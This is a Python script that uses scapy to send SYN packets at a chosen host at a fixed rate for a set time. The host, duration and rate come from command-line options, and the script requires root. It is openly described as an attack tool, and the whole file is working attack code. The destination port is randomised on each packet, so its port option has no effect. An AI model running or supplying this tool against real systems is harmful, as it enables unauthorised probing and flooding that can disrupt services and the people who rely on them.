import sys
import random
import argparse
import os
import time
import logging
import socket
from progressbar import *
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

if os.getuid() != 0:
    print("You need to run this program as root for it to function correctly.")
    sys.exit(1)

parser = argparse.ArgumentParser()
parser.add_argument('-t', action="store",dest='time', help='The amount of time to run the attack (minutes)')
parser.add_argument('-n', action="store",dest='packets_per_second', help='The number of packets to sent by second (2-8)')
parser.add_argument('-u', action="store",dest='url', help='The destination url to perform the attack')
parser.add_argument('-p', action="store",dest='port', help='The destination port for the SYN packet')

args = parser.parse_args()
if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)
args = vars(args)

timeout = time.time() + 60*float(args['time'])
countdown=60*float(args['time'])
iterationCount=0
ip_dest = socket.gethostbyname(args['url'])
print (ip_dest)

while (1):
    # Non privileged
    port = random.randint(1024,65535)
    a=IP(dst=ip_dest)/TCP(flags="S",  sport=RandShort(),  dport=port) 
    send(a,  verbose=0)
    iterationCount += 1

    countdown-=(1/int(args['packets_per_second']))
    sys.stdout.write('Countdown: %d s \r' % countdown)
    sys.stdout.flush()

    if time.time() > timeout:
        break

    time.sleep((1/(int(args['packets_per_second']))))

print("\nPackets sent: %d " % iterationCount)
